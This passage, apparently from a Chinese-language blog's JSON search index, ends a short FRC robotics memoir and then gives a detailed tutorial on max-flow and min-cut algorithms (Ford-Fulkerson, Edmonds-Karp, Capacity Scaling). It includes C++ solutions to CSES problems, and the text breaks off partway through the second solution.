aesthetics.\n\n在當年各隊中，應該算是一個還算各種能力都蠻平衡，而且還算發揮不錯的一隊吧（不知道是不是因為某位學長確實是對美學有非常強烈的堅持才會有美學平衡的部分）。\n喔對了，還有我們那時候 scouting\n的系統真的挺猛的，有每場的機器進球數統計資料、命中率、發射位置等等的，很多其實在當時都不知道重要性，甚至是隔年我自己是隊長比賽時都沒想到，找到對手的慣性，去打破它，那才是有效的策略。\n但其實當初的我根本沒這麼多想法，覺得自己超強，就只想著明年要做的更快更準，把大家打趴，去打世界賽，我的好夥伴感覺也抱持著差不多的想法，我們就一直插旗，結果最後就是一整個超趕，比賽各種狀況出包，要不然應該不會連自選聯盟都進不去的\nqaq\n還記得當初學長說：「臺灣的蝴蝶再猛，也難以飛越美國」 (我們隊名 MARAHO\n就是寬尾鳳蝶的意思) ，我還立了個 Flag\n：「太平洋再大，也無法阻擋台灣的蝴蝶飛越」，雖然說最後確實是飛越了啦，但那不是我原本預想的樣子就是了\nowo\n照片們 \n\n","categories":["FRC"],"tags":["FRC","比賽","回憶錄"]},{"title":"最大流 & 最小割 (Max-Flow & Min-Cut)","url":"/algo_Max-Flow_and_Min-Cut/","content":"\n前言 \n一個由多個站點連接而成的網絡裡，每對站點之間都有一定的數據傳輸限制 (單向)。現在你需要計算從網絡的入口（\n\\(s\\) ）到出口（ \\(t\\)\n）之間，數據可以同時傳輸的最大速度是多少。\n如下圖，從 \\(s\\) 到 \\(t\\)\n的最大傳輸速度為 2，最大速度會被路徑上最大傳輸流量所限制，因爲從 \\(s\\) 到 \\(t\\) 勢必通過路線 \\(v1\\rightarrow v2\\)\n，故這張圖的最大流量為 2。\nflowchart LR\ns --10--&gt; v1 --2--&gt; v3 --13--&gt; v4 --11--&gt; t\n而下面這個圖的最大流量為 19，下文提供一種可能的傳輸方式：\nflowchart LR\ns --10--&gt; v1\ns --17--&gt; v2\nv1 --7--&gt; v3 --11--&gt; t\nv2 --9--&gt; v4 --16--&gt; t\nv1 --6--&gt; v4\n\n傳輸 7： \\(s\\rightarrow v1\\rightarrow\nv3\\rightarrow t\\)\n傳輸 3： \\(s\\rightarrow v1 \\rightarrow v4\n\\rightarrow t\\) (因為 \\(s\\rightarrow\nv1\\)\n最多只能傳輸 10 因此在前一次傳輸 7 之後，接下來就只能傳輸 3 了)\n傳輸 9： \\(s \\rightarrow v2 \\rightarrow v4\n\\rightarrow t\\)\n7+3+9=19\n\n上述這樣的圖叫做 Network\nFlow (網路流)，在這樣的圖上尋找這種最大流的想法還可以運用在最小割 (後文會再解釋)、最多不重複路徑、二分圖最大匹配、二分圖最小頂點覆蓋等圖論問題。\n\nNetwork Flow(網路流)\n的基本定義 \n這邊可以先看個印象，之後如果有忘的再回來看\n\nA directed graph \\(G =\n(V,E)\\)\n\n只有一個 source point (入口，記作 \\(s\\) ) 和一個 sink point (出口，記作 \\(t\\) )\n\n\\(|V|\\) 為頂點數，\\(|E|\\) 為邊數\n\n\\(c(u,v)\\) (Capacity)：表示從 \\(u\\) 到 \\(v\\) 的容量\n(也就等價於前面舉例的最大流量限制，是圖給定的)\n\n\\(f(u,v)\\) (Flow)：表示從 \\(u\\) 到 \\(v\\) 的流量 (是可以自己設定的)\n\n\\(|f|=\\sum_{u\\in V}f(s,v)\\)\n(也就是從起點流出的總量)\n\\(r(u,v)\\) (Residual Capacity)：\n\\(edge(u,v)\\)\n上扣除已有流量還可以傳輸多少流量才會飽和，意即 \\(r(u,v)=c(u,v)-f(u,v)\\) (Residual Capacity =\nCapacity - Flow)\n\\(c_{max}\\) 表示所有 \\(c(u,v)\\) 中最大的那個\nResidual Graph：邊上數字皆為剩餘容量的圖\naugmenting path：一條起點為 \\(s\\)\n，終點為 \\(t\\)\n的簡單路徑（沒有環）\nbackward&nbsp;edge：反向邊（之後會提到）\n\\(\\forall \\ edge(u,v) \\notin E \\Rightarrow\nc(u,v) = 0 \\Rightarrow f(u,v) = 0\\)\n\\(\\forall \\ u \\in V - \\{s, t\\} , \\ \\exists\n\\ path: \\ s \\rightarrow u \\rightarrow t\\)\n容量限制：恆有 \\(0 \\leq f(u,v) \\leq\nc(u,v)\\)\n流量守恆： \\(\\forall \\ u \\in V - \\{s,t\\},\n\\ \\sum_{v\\in V}f(u,v) = \\sum_{v\\in V}f(v,u)\\)\n一個 \\(s-t\\ cut\\)\n表示能將圖切成兩個集合 \\(S,T\\) ，滿足：\n\n\\(S\\cap T = \\emptyset , \\ S\\cup T =\nV\\)\n\\(s\\in S, \\ t\\in T\\)\n\n\n\n何謂最大流 (Max-Flow) 與最小割 (Min-Cut)\n\n\n最大流 (Max-Flow)：從 \\(s\\) 到 \\(t\\) 的最大流量，寫的嚴謹一點就是： \\(|f|=\\sum_{u\\in V}f(s,v)\\) 的最大值\n最小割 (Min-Cut)：一個 \\(s-t\\ cut\\)\n，使得 \\(c(S,T)=\\sum_{u\\in S, v\\in\nT}c(u,v)\\) 為最小值\n\n而特別的是一張圖的最大流量等於最小割的容量，這個性質會在後續講述最小割時證明\n怎麼找到最大流？ \n我們或許可以從 \\(s\\)\n開始，每次找到一條 augmenting\npath，然後貪心地將這條路徑上每個邊的流量增加路徑上所有邊中最小的 Residual\nCapacity，不斷增加流量直到沒辦法增加為止 (增加流量視同於減少等量 Residual\nCapacity)，最後一路上所增加的流量 (或是減少的 Residual Capacity)\n或許就是最大流… 嗎?\n\n我們試著用這個方法來找找看。(圖上邊標示的數字代表 Residual Capacity\n，而起始時因為 Flow = 0 所以 Residual Capacity = Capacity)\nflowchart LR\ns --10--&gt; v1\ns --17--&gt; v2\nv1 --7--&gt; v3 --11--&gt; t\nv2 --9--&gt; v4 --16--&gt; t\nv1 --6--&gt; v4\n一開始走 \\(s \\rightarrow v1 \\rightarrow v3\n\\rightarrow t\\) ，這條路線上最小的 Residual Capacity 是 7\n，所以將每條路徑的 Residual Capacity 都減 9\n，那如果已經沒有剩餘流量的話就代表不能走了，所以我們就直接將這條邊移除\n(此時累計減少的 Residual Capacity = 7)\nflowchart LR\ns --3--&gt; v1\ns --17--&gt; v2\nv1 --6--&gt; v4\nv3 --4--&gt; t\nv2 --9--&gt; v4 --16--&gt; t\n接著走 \\(s \\rightarrow v1 \\rightarrow v4\n\\rightarrow t\\) ，這條路線上最小的 Residual Capacity 是 3\n，於是就將路徑都減 3 ，然後移除剩餘流量為 0 的邊 (此時累計減少的\nResidual Capacity = 10)\nflowchart LR\ns --17--&gt; v2\nv1 --3--&gt; v4\nv3 --4--&gt; t\nv2 --9--&gt; v4 --13--&gt; t\n最後就只剩下 \\(s \\rightarrow v2 \\rightarrow\nv4 \\rightarrow t\\) ，這條路線上最小的 Residual Capacity 是 9\n，於是就將路徑都減 9，然後移除剩餘流量為 0 的邊 (此時累計減少的 Residual\nCapacity = 19)\nflowchart TB\nsubgraph T\nv1 --3--&gt; v4\nv3 --4--&gt; t\nv4 --4--&gt; t\nend\nsubgraph S\ns --8--&gt; v2\nend\n因為已經沒辦法再找到一條 \\(s\\) 到\n\\(t\\)\n的簡單路徑了，所以就認為這張圖的最大流為 19\n，我們就來整理看看這個感覺會成功的想法。\nNaïve Algorithm \n因為需要找到一路上最小的 Residual\nCapacity，所以我們將圖上的邊設為 Residual\nCapacity 會相較同時紀錄 Flow 和 Capacity 來得方便，並且認定當某條邊的 Residual\nCapacity 為 0 時，那該條路徑已經不能夠走了，因此就能將終止條件不斷增加流量直到沒辦法增加為止改為找不到一條augmenting path (若是沒辦法繼續增加流量，就代表無法找到一條 augmenting\npath 上所有的 Residual\nCapacity 皆不為 0)，我們可以根據以上邏輯寫出虛擬碼：\nNaïve Algorithm 虛擬碼 \nInitialize \\(r(u, v)=c(u, v) \\ \\forall \\\nedge(u,v) \\in E\\)\nlet \\(answer\\) be \\(0\\)\nwhile exist an augmenting path \\(p\\)\n　　let \\(min_r\\) be \\(min_{edge(u, v) \\in p}r(u, v)\\)\n　　　　for each \\(edge(u, v)\\) in\n\\(p\\)\n　　　　　　\\(r(u, v)\\) -= \\(min_r\\)\n　　　　　　\\(answer\\) += \\(min_r\\)\n\n不過呢，其實這個做法是不對的，來看個反例\nflowchart LR\ns --1--&gt; a --2--&gt; t\ns --2--&gt; b --1--&gt; t\na --1--&gt; b\n如果一開始走的是 \\(s\\rightarrow a\n\\rightarrow b \\rightarrow t\\)\n的話，那整條路就中斷了，而這時的流量為 1，但很明顯的更好的做法應該是\n\\(s \\rightarrow a \\rightarrow t\\) 和\n\\(s \\rightarrow b \\rightarrow t\\)\n這時的流量為 2。\n難道努力這麼久想到的方法就這樣付之一炬了嗎? 我們有沒有可能想個辦法讓把原先走錯的路線復原，讓路給其他的流量走呢? 這就是Ford–Fulkerson Algorithm的精神。\nFord–Fulkerson Algorithm\n(時間複雜度 \\(O(fE)\\)) \n這就輪到的先前提到的backward edge(反向邊)出場了，我們在每次找到一條 augmenting\npath 時，將這條路徑上所有的邊的 Residual\nCapacity 減少，同時增加一條反向邊，將減少的 Residual\nCapacity 加到反向邊上，到時候其他路徑被該條路阻塞時，這條反向邊就像是能提供原先走錯路線復原的功能，讓路給其他的流量走，或許這樣講不夠清楚，我們直接將這個方法套用到先前失敗的例子上\n\nflowchart LR\ns --1--&gt; a --2--&gt; t\ns --2--&gt; b --1--&gt; t\na --1--&gt; b\n一開始一樣走 \\(s\\rightarrow a \\rightarrow b\n\\rightarrow t\\) ，因為路的最大剩餘容量為 1，因此將 augmenting path\n上的路線 - 1，並新增一條為反向剩餘容量為 1 的邊\nflowchart RL\nt --1--&gt; b\na --1--&gt; s\na --2--&gt; t\nb --1--&gt; a\ns --2--&gt; b\n這時因為有反向邊的關係，所以還可以走 \\(s\n\\rightarrow b \\rightarrow a \\rightarrow t\\)\n這條路線，這條路的最大剩餘容量為 1，因此將 augmenting path\n上的路線 - 1，並新增一條為反向剩餘容量為 1 的邊，且在經過此操作後已經沒有任何 augmenting\npath，所以答案就是減少的 Residual Capacity 總量也就是 2，符合答案\nflowchart RL\nt --2--&gt; a\nt --1--&gt; b\na --1--&gt; s\nb --2--&gt; s\na --1--&gt; b\n那麼為什麼這樣會對呢？如前文所說我們的反向邊是擔任一個復原的角色，當第二次路徑走\n\\(b \\rightarrow a \\rightarrow t\\)\n時，就像是跟上一次的路線說：「欸，你從 \\(a\\) 明明就可以直接走到 \\(t\\) ，我們來交換一下，你把上次走 \\(b\\rightarrow t\\) 的路權給我，然後你就不要走\n\\(a\\rightarrow b\\)\n這條路，改走我這次幫你發現的 \\(a\\rightarrow\nt\\) 這條路，這樣一來我們才可以創造最大價值！」\n而實現的的方法非常簡單，只要將原先的虛擬碼再多一個建立反向邊的程式就完成了\nFord–Fulkerson Algorithm 虛擬碼\n\nInitialize \\(r(u, v)=c(u, v) \\ \\forall \\\nedge(u,v) \\in E\\)\nlet \\(answer\\) be \\(0\\)\nwhile exist an augmenting path \\(p\\)\n　　let \\(min_r\\) be \\(min_{edge(u, v) \\in p}r(u, v)\\)\n　　　　for each \\(edge(u, v)\\) in\n\\(p\\)\n　　　　　　\\(r(u, v)\\) -= \\(min_r\\)\n　　　　　　\\(r(v, u)\\) += \\(min_r\\)\n　　　　　　\\(answer\\) += \\(min_r\\)\n\n複雜度 \n考慮到最糟糕的情況，每次都只增加 1 的流量，那麼最多就會需要增加最大流量次，這裡舉一個例子：\nflowchart LR\ns --100000--&gt; a --100000--&gt; t\ns --100000--&gt; b --100000--&gt; t\na --1--&gt; b\n考慮最糟狀況一開始從 \\(s\\rightarrow a\n\\rightarrow b \\rightarrow t\\) ，然後下一輪因為生成反向邊 \\((b,a)\\) 然後走 \\(s \\rightarrow b \\rightarrow a \\rightarrow\nt\\) 然後下一輪再走 \\(s\\rightarrow a\n\\rightarrow b \\rightarrow t\\)\n…… 如此反覆下去每次都只會使得流量增加 1 直到達到最大流，而就這個例子來說就是會走 200000 次\n所以最壞的情況下，時間複雜度為 \\(O(fE)\\) ， \\(f\\) 為最大流量， \\(E\\) 為邊數。很顯然的在流量很大很大可能\n\\(10^9\\)\n的情況下，這種方法是不好的，那有沒有什麼樣遍歷的方法可以讓每次增加的流量盡可能的高減少遍歷次數呢? 這就是Edmonds-Karp Algorithm和Capacity Scaling Algorithm在做的事。\nEdmonds-Karp Algorithm\n(時間複雜度 \\(O(|V||E|^2)\\)) \n在找 augmenting\npath 時，除了 DFS 之外，還有 BFS 可以用啊，利用 BFS 每次尋找最短的 augmenting\npath 會不會比較快呢？\n答案是會的，以下就是證明內容：\n以 \\(d_G(u)\\) 表示 \\(s\\) 到 \\(u\\) 的最短距離，而若 \\(u\\) 是 G 這張 Residual\nGraph 中最短的 augmenting path \\(P\\)，那麼這條路徑上從 \\(s\\) 到 \\(u\\) 的距離，就會是 \\(d_G(u)\\)（否則路徑 \\(P\\)\n就應該走那條更短的路），而在這個狀況下，也就必定會滿足：\\(d_G(v) = d_G(u) + 1\\) \\(\\ \\forall \\ edge(u,v) \\in P\\)\n(否則路徑 P 就應該走那條更短的路線到 \\(u\\) )\n我們在 BFS 的時候找到最短 augmenting path，令這條路徑上的最小 Residual\nCapacity 為 \\(r(u, v)\\)\n，紀錄當前的 Residual Graph 為 \\(G_1\\)\n，而所以在這輪之後，Residual Graph 中的 \\(r(u,\nv)\\) 就會變成 \\(0\\)\n，若是在之後的 Residual Graph \\(G_2\\)\n中有一條 augmenting path 包含 \\(edge(v,\nu)\\) ，那麼這條邊就會重新復活，而 \\(d(u)\\)\n會發生神奇的變化，使得每條邊最多只會被使用 \\(|V|\\) 次，而以下就是詳細的說明：\n\n\\(d_{G_1}(v) = d_{G_1}(u) +\n1\\)\n\\(d_{G_2}(u) = d_{G_2}(v) +\n1\\)\n\\(d_{G_1}(v) \\leq\nd_{G_2}(v)\\)\n證明 (建議是全部看完再來看這個)\n\n為了避免這邊與先前所用的符號重疊導致混淆，這邊改為使用 \\(x,y,z,a,b,c\\) 等其它記號表示。\n我們可以不失一般性的假設 \\(G_2\\) 是\n\\(G_1\\)\n的下一張圖，因為當這個情況下假設成立，可使用遞迴的方式證明 \\(G_1\\) 後的數張圖皆成立 ( \\(G_2\\) 成立則 \\(G_2\\) 下一張圖會成立則 \\(G_2\\) 下下一張圖成立……)\n試以反證法證明 \\(\\forall \\ x\\in V, \\\nd_{G_1}(x) &gt; d_{G_2}(x)\\) 不成立：\n1. 對於 \\(s\\) 或所有與 \\(s\\) 僅通過一條邊聯通的節點所形成的集合\n\\(Y\\) ，其中任意一點 \\(y\\) 皆滿足 \\(d_{G_1}(y) \\leq d_{G_2}(y)\\)\n2. 由上可知，對圖上一些滿足 \\(d_{G_1}(z) &gt;\nd_{G_2}(z)\\) 的點集 \\(Z\\) ，\n\\(Z \\subsetneqq V\\) ，而這邊特別定義\n\\(a\\) 為符合 \\(min_{i\\in Z}d_{G_2}(i)\\) 的一點，也就是\n\\(Z\\) 集合中在 \\(G_2\\) 中距離 \\(s\\) 最近的節點。\n3. \\(\\because Z \\cap Y = \\emptyset \\\n\\therefore\\) 從 \\(s\\) 到 \\(a\\) 一定需要一個中繼點也就是說 \\(\\exists \\ edge(b, a)\\in G_2\\) 使得 \\(s\\) 到 \\(a\\) 的最短路徑中包含 \\(edge(b, a)\\)\n\\(\\implies d_{G_2}(b) + 1 =\nd_{G_2}(a)\\)\n\\(\\implies d_{G_2}(b) &lt;\nd_{G_2}(a)\\)\n\\(\\implies b \\notin Z\\) (因為 \\(d_{G_2}(a)\\) 是在 \\(Z\\) 中最短的)\n\\(\\implies d_{G_1}(b) \\leq\nd_{G_2}(b)\\)\n4. 若在 \\(G_1\\) 的 Residual Graph 包含\n\\(edge(b,a)\\)，而從 \\(s\\) 到 \\(a\\) 點的最短距離有可能是經過 \\(b\\) 再到 \\(a\\) 或是有另外一條更短的路\n\\(\\implies d_{G_1}(a) \\leq\nd_{G_1}(b)+1\\)\n\\(\\implies d_{G_1}(a) \\leq\nd_{G_2}(b)+1\\) (由 \\(d_{G_1}(b) \\leq\nd_{G_2}(b)\\) 推得)\n\\(\\implies d_{G_1}(a)\\leq d_{G_2}(a)\\)\n(由 \\(d_{G_2}(a) = d_{G_2}(b)+1\\)\n推得)\n\\(\\implies\\) 與假設 \\(d_{G_1}(a) &gt; d_{G_2}(a)\\) 矛盾，故在\n\\(G_2\\) 中 \\(Z\\) 不存距離 \\(s\\) 最近的節點，故 \\(Z\\) 不存在\n5. 若在 \\(G_1\\) 的 Residual Graph 不包含\n\\(edge(b,a)\\) ，又因為 \\(G_2\\) 是 \\(G_1\\) 的下一張圖，所以這種狀況只有可能是\n\\(G_1\\) 的 augmenting path 流經 \\(edge(a,b)\\) ，使得在下一張圖創造了一條\n\\(edge(b,a)\\) ，因此可以給定 \\(d_{G_1}(a)+1 = d_{G_1}(b)\\)\n\\(\\implies d_{G_1}(a)+1 \\leq d_{G_2}(b) =\nd{G_2}(a)-1\\)\n(由 \\(d_{G_1}(b) \\leq d_{G_2}(b)\\) 和\n\\(d_{G_2}(a) = d_{G_2}(b)+1\\)\n推得)\n\\(\\implies d_{G_1}(a)+2 \\leq\nd{G_2}(a)\\)\n\\(\\implies d_{G_1}(a) &lt;\nd{G_2}(a)\\)\n\\(\\implies\\) 與假設 \\(d_{G_1}(a) &gt; d_{G_2}(a)\\) 矛盾，故在\n\\(G_2\\) 中 \\(Z\\) 不存距離 \\(s\\) 最近的節點，故 \\(Z\\) 不存在\np.s.\n這個證明不知道為什麼感覺好像網路上找到的都有種跳太快的感覺，花了好多時間才看懂，所以這邊特別寫得很詳細，希望大家都能看懂 (還是其實單純我太笨了 xd)\n\n\n\\(d_{G_1}(u)+1 \\leq\nd_{G_2}(u)-1\\)\n\\(\\implies d_{G_1}(u)+2 \\leq\nd_{G_2}(u)\\)\n\n\\(\\forall \\ G, \\ d_{G}(u) &lt;\n|V|\\) 又因為一條邊每被重複用一次就會遠離 \\(s\\) 兩個節點\n\\(\\implies\\) 每條 \\(edge(u,v)\\) 必定只會被使用 \\(\\frac{|V|}{2}\\)\n\n總共有 \\(|E|\\)\n條邊，每條邊最多被使用 \\(\\frac{|V|}{2}\\) 次，所以最多有 \\(|E|\\times\\frac{|V|}{2}\\)\n次 BFS，又每次 BFS 的時間複雜度為 \\(O(|E|)\\) ，所以總時間複雜度為 \\(O(|V||E|^2)\\)\n\n註：因為這個演算法的實作其實不是很方便，而且複雜度也比後面要講的差，所以這個演算法應該是比較少會用到的\nCapacity\nScaling Algorithm (時間複雜度 \\(O(|E|^2(1+log(c_{max}))\\)) \n這個演算法我喜歡多了，證明簡單設計巧妙，而且在幾乎所有的狀況下複雜度都比前者好 (除非\n\\(c_{max}&gt;2^{|V|}\\))，因此通常我都是使用這個演算法來寫題目。\n這個演算法的邏輯是設定一個 \\(threshold\\) 每次都只使用 \\(c(u,v)\\geq threshold\\) 的邊作為 augmenting\npath 直到使用當前 \\(threshold\\)\n無法找到一條 augmenting path 就將 \\(threshold\\) 除以二，反覆執行直到 \\(threshold=0\\) ，那因為 \\(threshold\\) 找 augmenting path 的最後一次是\n\\(threshold=1\\) 也就是 Ford–Fulkerson\nAlgorithm 時的狀態，所以最後一定能找出正確的最大流\n定義： \\(G'\\) 表示 Residual\nGraph 上除去所有 \\(c(u,v) &lt;\nthreshold\\) 的邊後的圖\nCapacity Scaling Algorithm\n虛擬碼 \nInitiassze \\(r(u, v)=c(u, v) \\ \\forall \\\nedge(u,v) \\in E\\)\nlet \\(answer\\) be \\(0\\)\nlet \\(threshold\\) be \\(c_{max}\\)\nwhile \\(threshold &gt; 0\\)\n　　while exist an augmenting path \\(p\\) in \\(G'\\)\n　　　　let \\(min_r\\) be \\(min_{edge(u, v) \\in p}r(u, v)\\)\n　　　　　　for each \\(edge(u, v)\\) in\n\\(p\\)\n　　　　　　　　\\(r(u, v)\\) -= \\(min_r\\)\n　　　　　　　　\\(r(v, u)\\) += \\(min_r\\)\n　　　　　　　　\\(answer\\) += \\(min_r\\)\n　　\\(threshold = threshold/2\\)\n\n我們一一分解各個迴圈會被執行的時間複雜度：\n很明顯的 \\(threshold\\) 每次除以二，又\n\\(threshold\\) 起始值為 \\(c_{max}\\) ，那就是 \\(log(c_{max})\\) 量級的，但是因為要考慮到\n\\(c_{max}=1\\) 的狀況，所以特別 \\(+1\\)\nwhile \\(threshold &gt; 0\\) ： \\(O(1+log(c_{max}))\\)\n\n很明顯的 \\(threshold\\)\n每次除以二，又 \\(threshold\\) 起始值為\n\\(c_{max}\\) ，那就是 \\(log(c_{max})\\) 量級的，但是因為要考慮到\n\\(c_{max}=1\\) 的狀況，所以特別 \\(+1\\)\n\n\nwhile exist an augmenting path \\(p\\)\nin \\(G'\\) ： \\(O(|E|)\\)\n\n我們可以巧妙透過當前 \\(flow\\) 和\n\\(max-flow\\)\n的關係來說明這件事情，我們在每一輪開始前，可以確定：\n\n每條邊的 Residual Capacity 都比上次的 \\(threshold\\) (也就是兩倍當前的 \\(threshold\\) ) 來得小，也就是 \\(\\sum r_{cur}(u,v) \\leq |E| \\cdot 2 \\cdot\nthreshold\\)\n當前這張圖的 \\(max-flow\\)\n一定小於等於所有容量的總和 (詳見後續證明) ，也因此 \\(max-flow\\) 與 \\(flow\\) 的差一定也小於等於剩餘流量的總和\n(詳見後續證明)，所以在這回合中透過 augmenting\npath 增加的流量總和會小於等於剩餘流量的總和\n\n因為只會看在 \\(G'\\)\n上的邊，所以每次的 augmenting path 都會增加至少 \\(threshold\\)\n的流量，結合前述兩點可知 augmenting path 增加的流量總和 \\(\\leq \\sum r_{cur}(u,v) \\leq 2 |E|\nthreshold\\) ，因此找 augmenting path 的次數就會 \\(\\leq \\sum \\frac{r_{cur}(u,v)}{threshold} \\leq\n\\frac{2 |E| threshold}{threshold} = 2|E|\\)\n\n所以說這輪所需花費的時間複雜度上界就會是 \\(O(2|E|)=O(|E|)\\)\n證明\n定義 \\(f_{max}(u,v)\\) 表示當有 \\(max-flow\\) 各個邊的流量、\\(f_{cur}(u,v)\\) 表示當前各個邊的流量、\\(r_{cur}(u,v)\\) 表示當前各個邊的剩餘容量\n\n當前這張圖的 \\(max-flow\\)\n一定小於等於所有容量的總和\n\\[\\sum f_{max}(u,v) \\leq \\sum\nc(u,v)\\]\n\n\\(max-flow\\) 與 \\(flow\\)\n的差一定也小於等於剩餘流量的總和\n\\[\\sum f_{max}(u,v)-f_{cur}(u,v) \\leq \\sum\nc(u,v)-f_{cur}(u,v) = \\sum r_{cur}(u,v)\\]\n\n\n\nclose DFS 和 for each \\(edge(u, v)\\)\nin \\(p\\) ： \\(O(|E|)\\)\n\nDFS 是 \\(O(|E|)\\) ， \\(p\\) 所含的路徑總量最多是 \\(O(|V|)\\) ，則總時間複雜度 \\(O(|E|+|V|) = O(|E|)\\)\n\n\n總時間複雜度： \\(O(|E|^2(1+log(c_{max}))\\)\n如果有好幾個 source 或 sink 怎麼辦？\n\nflowchart LR\ns1 ---&gt; t1\ns1 ---&gt; t2\ns2 ---&gt; t2\ns2 ---&gt; t3\ns3 ---&gt; t3\ns4 ---&gt; t3\ns4 ---&gt; t4\ns5 ---&gt; t4\n這樣的圖可以透過增加一個新的 source \\(s\\) 和一個新的 sink \\(t\\) 來解決，將所有的 source 都連接到 \\(s\\)(管線容量為無限大)，所有的 sink 也都連接到 \\(t\\)(管線容量為無限大)，這樣就可以將問題轉換成一個 source 和 sink 的問題。\nflowchart LR\ns ---&gt; s1 ---&gt; t1 ---&gt;t\ns ---&gt; s1 ---&gt; t2 ---&gt;t\ns ---&gt; s2 ---&gt; t2 ---&gt;t\ns ---&gt; s2 ---&gt; t3 ---&gt;t\ns ---&gt; s3 ---&gt; t3 ---&gt;t\ns ---&gt; s4 ---&gt; t3 ---&gt;t\ns ---&gt; s4 ---&gt; t4 ---&gt;t\ns ---&gt; s5 ---&gt; t4 ---&gt;t\n最大流的推廣 &amp; 例題 \n先回顧一下我們有那些找到最大流的演算法\n\nFord–Fulkerson Algorithm，時間複雜度 \\(O(fE)\\) ， \\(f\\) 為最大流量\n\nEdmonds-Karp Algorithm，時間複雜度 \\(O(VE^2)\\) (大致上不會用到)\n\nCapacity Scaling Algorithm，時間複雜度 \\(O(|E|^2(1+\\log (c_{max}))\\)\n\n可能大部分人寫最大流問題會直接選 Capacity Scaling\nAlgorithm，因為時間複雜度最低，而且實作簡單，但這樣想就錯了，在蠻多應用中，邊的容量都是 1，這時候使用 Ford–Fulkerson\nAlgorithm 就可以更簡單解決問題，而且也不會爆複雜度 (最大流量必定小於等於頂點數 - 1)。\n最大流 \n因為前面都講過了，所以就來個例題吧~\nCSES Download\nSpeed\n\nConsider a network consisting of n computers and m connections. Each\nconnection specifies how fast a computer can send data to another\ncomputer.\nKotivalo wants to download some data from a server. What is the maximum\nspeed he can do this, using the connections in the network?\n\n解法：因為每條容量最大會到 \\(10^9\\)\n，所以就用 Capacity Scaling Algorithm\n&lt;summary&gt;程式碼&lt;/summary&gt;#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n, m;int adj[502][502];bool vis[502];bool dfs(int rt, vector&lt;int&gt; &amp;path, int threshold) {    if (vis[rt]) return false;    vis[rt] = 1;    if (rt == n) {        path.push_back(rt);        return true;    }    rep(i, 1, n) {        if (adj[rt][i] &lt; threshold) continue;        if (dfs(i, path, threshold)) {            path.push_back(rt);            return true;        }    }    return false;}signed main() {    ios;    cin &gt;&gt; n &gt;&gt; m;    int threshold = 0;    rep(i, 1, m) {        int a, b, c;        cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;        adj[a][b] += c;        tomax(threshold, c);    }    int ans = 0;    while (threshold &gt; 0) {        vector&lt;int&gt; path;        memset(vis, 0, sizeof(vis));        if (dfs(1, path, threshold)) {            reverse(path.begin(), path.end());            int k = path.size();            int flow = 1e9;            rep (i, 0, k-2) tomin(flow, adj[path[i]][path[i + 1]]);            ans += flow;            rep (i, 0, k-2) {                adj[path[i]][path[i + 1]] -= flow;                adj[path[i + 1]][path[i]] += flow;            }        } else threshold &gt;&gt;= 1;    }    cout &lt;&lt; ans &lt;&lt; \"\\n\";    return 0;}\n\n最小割 \n\n最小割 (Min-Cut)：一個 \\(s-t\\ cut\\)\n，使得 \\(c(S,T)=\\sum_{u\\in S, v\\in\nT}c(u,v)\\) 為最小值\n\n我先定義 \\(f(S,T)=\\sum_{u\\in S, v\\in\nT}f(u,v)\\) ，因為任何一個割的流量都來自 \\(s\\) ，因此我們可以很輕易的推得：\n\\[\\forall \\ s-t\\ cut, f(S,T) =\n|f|\\]\n( \\(|f|\\) 為 \\(s\\) 流入的總流量)\n因為每個 \\(cut\\)\n流量都一樣，所以說我們可以把最小割問題想做是不斷把入口的流量增大，直到有第一個\n\\(cut\\) ，使得 \\(f(S,T)=c(S,T)\\)\n，那麼就找到最小割了，要怎麼知道這個是最大流呢？也很簡單，因為對於個\n\\(cut\\) 上的每一條邊，都有 \\(f(u,v)=c(u,v)\\)\n，若是想再增加流量，每當流經這個 \\(cut\\)\n時，流量都會被阻塞，無法使得總流量變得更大。\n而至於應該怎麼找到一個合法的最小割，還有最小割上的邊，可以看看下面的例題。\n最小割の例題 \nCSES Police\nChase\n\nKaaleppi has just robbed a bank and is now heading to the harbor.\nHowever, the police wants to stop him by closing some streets of the\ncity.\nWhat is the minimum number of streets that should be closed so that\nthere is no route between the bank and the harbor?\n\n解法：這題可以把所有路徑的容量都設成 1，然後用 Ford–Fulkerson\nAlgorithm 找到最小割的容量了，接著利用最後一次找 augmenting\npath 拜訪過的點區分各點是屬於 \\(S\\) 還是\n\\(T\\) 集合 (因為最後一次找 augmenting\npath 是失敗的，整張圖已經有最大流，並且存在一個最小割上的容量 = 流量，所以說最小割的剩餘流量為 0，因此從起始點\n\\(s\\)\n流經過那一個最小割時，所有的路線都會被阻塞，這時就能利用當前是否被拜訪，判斷點是在哪個集合中)，而跨越\n\\(s\\) 和 \\(t\\) 的邊，就會是最小割的其中一員。\n&lt;summary&gt;程式碼&lt;/summary&gt;CSES Police Chase#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n, m, ans;int g[502][502];bool vis[502];bool dfs(int rt){    if(vis[rt]) return 0;    if(rt == n) return 1;    vis[rt] = 1;    rep(i, 1, n){        if(g[rt][i] 